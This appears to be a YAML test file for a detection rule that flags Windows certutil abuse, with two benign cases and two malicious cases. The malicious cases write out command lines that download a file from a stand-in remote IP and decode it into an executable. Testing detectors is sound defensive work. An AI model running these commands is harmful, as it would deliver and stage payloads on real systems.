rule_id: 1ac9f900-11f8-42f7-9229-c20b3dfddeac
cases:
  - name: urlcache download
    expect: match
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\Users\Public\a.txt'
  - name: base64 decode of dropped payload
    expect: match
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil /decode C:\Users\Public\a.txt C:\Users\Public\a.exe'
  - name: urlcache without a URL (cache listing)
    expect: no_match
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil -urlcache *'
  - name: certificate store inspection
    expect: no_match
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil -store my'
